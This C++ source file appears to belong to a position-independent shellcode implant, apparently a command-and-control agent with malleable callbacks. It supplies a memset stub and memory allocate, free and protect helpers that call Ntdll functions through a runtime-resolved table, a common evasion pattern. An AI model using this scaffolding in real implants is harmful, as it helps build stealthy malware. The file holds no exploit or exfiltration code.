#include <windows.h>
#include <Native.h>
#include <Agent.h>
#include <Defines.h>
#include <Internals.h>

// memset stub - the compiler may emit a memset call when zero-initialising large
// structs (e.g. Agent::Config with the malleable callback fields).  The shellcode
// has no C runtime, so we provide the symbol ourselves.
extern "C" DECLFN void* memset( void* dst, int c, size_t n )
{
    unsigned char* p = (unsigned char*)dst;
    unsigned char  v = (unsigned char)c;
    size_t         i = n;
    while ( i-- ) *p++ = v;
    return dst;
}

// Allocate Virtual memory RW in the current process
DECLFN PVOID Mem_Alloc( SIZE_T size )
{
    G_AGENT;

    PVOID base      = nullptr;
    SIZE_T region   = size;

    NTSTATUS status = Self->Ntdll.NtAllocateVirtualMemory( (HANDLE)-1, &base, 0, &region, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    
    return NT_SUCCESS( status ) ? base : nullptr;
}

// release virtual memory
DECLFN void Mem_Free( PVOID ptr, SIZE_T size )
{
    G_AGENT;
    if ( !ptr ) return;

    SIZE_T region = size;
    Self->Ntdll.NtFreeVirtualMemory( (HANDLE)-1, &ptr, &region, MEM_RELEASE );

}

// Changes the protection on a region
DECLFN BOOL Mem_Protect( PVOID ptr, SIZE_T size, ULONG protect )
{
    G_AGENT;

    SIZE_T region = size;
    ULONG oldProt = 0;

    NTSTATUS status = Self->Ntdll.NtProtectVirtualMemory((HANDLE)-1, &ptr, &region, protect, &oldProt);

    return NT_SUCCESS( status );
}